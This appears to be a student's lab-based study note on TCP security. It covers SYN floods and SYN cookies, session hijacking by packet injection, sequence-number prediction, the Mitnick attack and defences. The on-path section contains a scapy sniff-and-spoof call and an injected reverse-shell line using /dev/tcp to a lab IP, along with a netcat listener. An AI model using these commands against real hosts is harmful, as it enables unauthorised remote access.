
2026-02-18

Tags: [[Networking and Network Security]]
# TCP Security
### On-path Attacks
The most obvious vector for attacking TCP is by spoofing a packet, since by their nature TCP packets need to be read by the router.

**Syn Flood** is a denial of service attack where an attacker sends a number of SYN packets, often spoofed, requesting a connection but without any follow up. This means the server will wait expecting a connection but is actually wasting resources. If it isn't stopped then the server will be unable to form new connections. This can be mitigated by using **SYN cookies**, which rather than storing state in a SYN queue it encodes the state into the SYN-ACK sequence number (cookie) and validates it when the ACK arrives.

**Ingestion Attacks** work by injecting a spoofed TCP packet into an already established connection, with the goal of either terminating the session or hijacking the session. This is easiest when the attacker is "on-path" and has a copy of the packet available to them. We can automagically sniff packets and attempt to hijack the session using the scapy command below.
`sniff(iface='br-7fa07fc9a0a6', filter=myFilter, prn=spoof)`

We can then just throw up a reverse shell 
```bash
data = "\n/bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
On attacker: nc –lnv 9090
```

### Off-path Injection
What if it is too inconvenient to be on the path of your victim? This is actually a much harder problem since in an off-path injection attack an attacker needs to guess or predict the proper sequence number of the server. 

When we are doing prediction there are several things working in our favor, in 4.2 BSD sequence numbers started with a global value and increased it by 128 per second and by 64 per connection. When making a prediction an attacker will initiate a legitimate connection with the server and observe the ISN used and for the next connection the server will use ISN+64.

**The Mitnick Attack**
![[Pasted image 20260218142344.png]]
1. SYN flood the trusted server
2. Spoof trusted servers IP address in SYN to x-terminal
3. trusted server is too busy to RST
4. ACK with the guessed sequence number
5. Grant access to all sources
6. RST to trusted server (cleanup)

This attack works because we are able to slow down the trusted server enough to cause chaos, and in that chaos we impersonate the trusted server which is too busy to refute our impersonation and we ACK using our guessed ACK number. Once we're in then we can grant our access to all sources and then close the connection to the original trusted server. 


**Defense:**
- Instead of generating 128 SN's per second we can instead generate 250,000 SN's per second
- We can also randomize the ISN or increment so that it is hard to predict the SN.

**Guessing Strategies**
Since it's hard to predict the ISN of the next connection then what if instead we guess the next SN based on the servers TCP behavior

Example given:
- A host will not respond to a packet with correct SN and ACK; otherwise, it will send back a challenge ACK packet to the sender
- A host will accept the bytes with SN between RCV.NEXT and (RCV.NEXT+RCV.WND-1)
- A host cannot acknowledge data that were never sent

How to guess the correct ACK?
The strategy is to divide the address space into two halves and pick an ACK from each half.

# References
- [[TCP]]
- [[Denial of Service Attacks and DDoS Attacks]]
- [RFC describing blind in window attacks](https://www.rfc-editor.org/rfc/rfc5961.html)

